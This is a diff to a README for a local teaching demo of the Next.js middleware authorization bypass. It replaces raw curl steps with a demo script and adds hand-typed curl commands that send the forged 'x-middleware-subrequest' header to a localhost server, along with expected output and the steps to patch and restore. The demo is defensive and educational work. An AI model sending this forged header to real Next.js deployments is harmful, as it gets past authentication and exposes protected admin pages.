@@ -45,8 +45,7 @@ Click **Log in** (stub — any values) to set the cookie, then `/admin` loads.
 
 ## How to demo it (live, ~2 minutes)
 
-A tight script for presenting. Open **two terminals**: one running the server,
-one for `curl`.
+Open **two terminals**: one runs the server, one runs the demo.
 
 **Terminal A — start the (vulnerable) server:**
 
@@ -55,24 +54,30 @@ npm install          # first time only
 npm run dev          # leave running; serves http://localhost:3000
 ```
 
-**Terminal B — run these in order and read the HTTP status out loud:**
+**Terminal B — run the demo script:**
 
 ```bash
-# 1. Honest unauthenticated user -> bounced to /login (307)
-curl -i http://localhost:3000/admin
-
-# 2. Attacker forges the header -> middleware SKIPPED, admin page served (200)
-curl -i -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
-  http://localhost:3000/admin
-
-# 3. Same attack vs the hardened page -> still blocked (307), in-page check holds
-curl -i -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
-  http://localhost:3000/admin-secure
+./demo.sh
 ```
 
-Talking point for step 2: *"No session cookie, no login — yet we get
-`200 OK` and `Welcome, authenticated admin`, because the forged header made
-Next.js skip the middleware entirely."*
+It fires the three requests and prints only the signal — status code, redirect
+target, and whether the admin page leaked. Expected output on the vulnerable
+build:
+
+```
+[1] Honest user, NO session cookie      GET /admin
+  HTTP 307  ->  /login?from=%2Fadmin
+[2] Attacker forges the header          GET /admin   (+ forged header)
+  HTTP 200
+  >>> BYPASS SUCCEEDED: admin page served with no session cookie
+[3] Same attack vs hardened page        GET /admin-secure   (+ forged header)
+  HTTP 307  ->  /login
+```
+
+Talking point for step 2: *"No session cookie, no login — yet we get `200 OK`
+and the admin page, because the forged header made Next.js skip the middleware
+entirely. Step 3 is the same attack, but that page re-checks the session itself,
+so it still redirects."*
 
 **Then show the fix.** In Terminal A, stop the server (Ctrl-C) and upgrade:
 
@@ -82,16 +87,47 @@ rm -rf .next
 npm run dev
 ```
 
-Re-run step 2 from Terminal B — it now returns `307 → /login`. The bypass is
-dead. Restore the vulnerable build for the next run with
-`npm install next@15.2.2 --save-exact && rm -rf .next`.
+Re-run `./demo.sh` — step 2 now shows `HTTP 307 -> /login` and `bypass failed
+(this is a PATCHED build — good)`. Restore the vulnerable build for the next run:
+
+```bash
+npm install next@15.2.2 --save-exact
+rm -rf .next
+```
 
 > **Prefer a browser?** Visit `/admin` (redirects to `/login`), click **Log in**
-> to set the cookie, then `/admin` loads. `curl` is used for the attack because
-> browsers won't let you add the forged header to a normal navigation.
+> to set the cookie, then `/admin` loads. `curl` is used for the attack because a
+> browser won't let you add the forged header to a normal navigation.
 
-The sections below are the same three requests with expected output, plus the
-explanation of why the patch works.
+### Running the requests by hand
+
+If you'd rather type the requests instead of using `demo.sh`, use these. They
+print just the status line (and, for the attack, the proof) — not the whole HTML
+page.
+
+```bash
+curl -s -o /dev/null -w "%{http_code}\n" http://localhost:3000/admin
+```
+
+```bash
+curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://localhost:3000/admin | grep -o "Welcome, authenticated admin"
+```
+
+```bash
+curl -s -o /dev/null -w "%{http_code}\n" -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://localhost:3000/admin-secure
+```
+
+> **zsh tip:** paste the commands **without** the `#` comment lines. In zsh the
+> parentheses in a comment like `(307)` are treated as a glob and throw
+> `zsh: no matches found` / `unknown file attribute`. The `curl` lines above have
+> no comments, so they paste cleanly.
+>
+> Use `curl -i` only if you want to *see* the raw response headers + HTML. The
+> long `<script>self.__next_f...>` blob in that output is Next.js's React Server
+> Components payload (normal framework output), not anything in this app.
+
+The sections below repeat the same three requests with the raw `curl -i` form
+and explain why the patch works.
 
 ---
 
